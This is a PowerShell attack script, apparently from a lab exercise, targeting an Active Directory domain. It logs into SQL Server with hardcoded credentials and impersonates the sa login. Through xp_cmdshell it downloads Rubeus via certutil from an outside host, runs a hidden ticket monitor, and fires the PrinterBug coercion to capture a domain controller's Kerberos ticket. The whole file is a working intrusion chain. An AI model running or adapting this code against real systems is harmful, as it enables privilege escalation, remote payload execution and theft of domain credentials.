[CmdletBinding()]
param(
    [string]$SqlServer = "192.168.77.22",
    [string]$TargetDC = "dc02.child.cadre.local",
    [string]$Listener = "mbr01.child.cadre.local"
)
$ErrorActionPreference = "Stop"
try {
    Add-Type -AssemblyName System.Data
    $connStr = "Server=$SqlServer;Database=master;Integrated Security=false;User ID=analyst_t1;Password=T13r_An@lyst!;TrustServerCertificate=True;"
    $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
    $conn.Open()
    Write-Output "SQL_OK: connected to $SqlServer as analyst_t1"

    function Invoke-SqlScalar($sql) {
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        return $cmd.ExecuteScalar()
    }

    function Invoke-SqlReader($sql) {
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
        $reader = $cmd.ExecuteReader()
        $rows = @()
        while ($reader.Read()) {
            if ($reader.IsDBNull(0)) { continue }
            $rows += $reader.GetString(0)
        }
        $reader.Close()
        return $rows
    }

    # Prepare output directory on mbr01
    Invoke-SqlReader "EXEC master..xp_cmdshell 'powershell -NoProfile -Command mkdir C:\Tools\cadre-attack -Force'" | Out-Null

    # Download Rubeus if not present (via certutil)
    $dl = Invoke-SqlReader "EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://192.168.77.60:8888/Rubeus.exe C:\Tools\cadre-attack\Rubeus.exe'"
    $dl | ForEach-Object { Write-Output "DL: $_" }

    # Clear old capture
    Invoke-SqlReader "EXEC master..xp_cmdshell 'powershell -NoProfile -Command Remove-Item C:\Tools\cadre-attack\dc02_tgs.txt -ErrorAction SilentlyContinue'" | Out-Null

    # Start Rubeus monitor as SYSTEM SQL service
    $monitorCmd = '"C:\Tools\cadre-attack\Rubeus.exe" monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:C:\Tools\cadre-attack\dc02_tgs.txt'
    $startMonitor = Invoke-SqlReader "EXEC master..xp_cmdshell 'powershell -NoProfile -Command Start-Process -FilePath cmd -ArgumentList \"/c start /B $monitorCmd\" -WindowStyle Hidden'"
    $startMonitor | ForEach-Object { Write-Output "MONITOR: $_" }

    Start-Sleep -Seconds 3

    # Trigger PrinterBug from mbr01 (SQL service context) to dc02 -> listener mbr01
    $trigger = Invoke-SqlReader "EXEC master..xp_cmdshell 'C:\Tools\ADTools\MS-RPRN.exe \\$TargetDC \\$Listener'"
    $trigger | ForEach-Object { Write-Output "TRIGGER: $_" }

    Start-Sleep -Seconds 6

    # Read captured TGS
    $content = Invoke-SqlReader "EXEC master..xp_cmdshell 'powershell -NoProfile -Command Get-Content C:\Tools\cadre-attack\dc02_tgs.txt -ErrorAction SilentlyContinue'"
    $found = $false
    $content | ForEach-Object {
        Write-Output $_
        if ($_ -match "KIRBI") { $found = $true }
    }

    if ($found) {
        Write-Output "T102_OK: captured DC02`$ TGS via SQL+GodPotato on mbr01"
    } else {
        Write-Output "T102_INFO: coercion attempted; check dc02_tgs.txt manually"
    }

    $conn.Close()
} catch {
    Write-Output "T102_FAIL: $($_.Exception.Message)"
    exit 1
}
